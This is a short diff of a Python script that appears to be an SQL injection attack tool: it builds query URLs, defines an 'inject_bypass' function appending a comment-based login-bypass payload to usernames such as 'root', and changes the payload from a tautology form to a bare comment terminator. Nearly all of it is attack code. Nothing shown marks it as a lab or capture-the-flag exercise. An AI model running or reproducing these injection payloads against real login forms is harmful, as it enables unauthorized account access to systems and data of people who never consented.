@@ -7,14 +7,14 @@ def send_request(params, url):
     query = urlp.urlencode(params)
     url = url + "?" + query
 
-    print(url)
+    # print(url)
     with urlr.urlopen(url) as response:
         return response.read(400)
 
 
 def inject_bypass(user):
-    return user + "\"-- or 1 == 1 --"
-
+    return user + "\"--"
+    # return user + "\"-- or 1 == 1 --"
 
 usernames = {
     "root",
